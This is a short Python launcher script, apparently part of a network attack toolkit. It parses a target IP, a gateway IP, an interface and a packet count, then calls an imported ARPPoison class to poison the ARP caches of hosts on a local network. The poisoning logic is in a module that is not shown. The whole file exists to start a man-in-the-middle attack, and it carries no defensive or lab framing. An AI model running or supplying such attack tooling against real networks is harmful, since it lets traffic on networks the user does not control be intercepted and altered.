import os
import sys

sys.path.append(os.getcwd())

from utils.basic.parser import default_arp_poison_args
from utils.webservices.arp_poison import ARPPoison

parser = default_arp_poison_args()

target_ip = parser.target_ip
getaway_ip = parser.getaway_ip
interface = parser.interface
packet_count = parser.packet

arp = ARPPoison(interface, target_ip, getaway_ip, packet_count)

arp.init_arp(interface, target_ip, getaway_ip, packet_count)
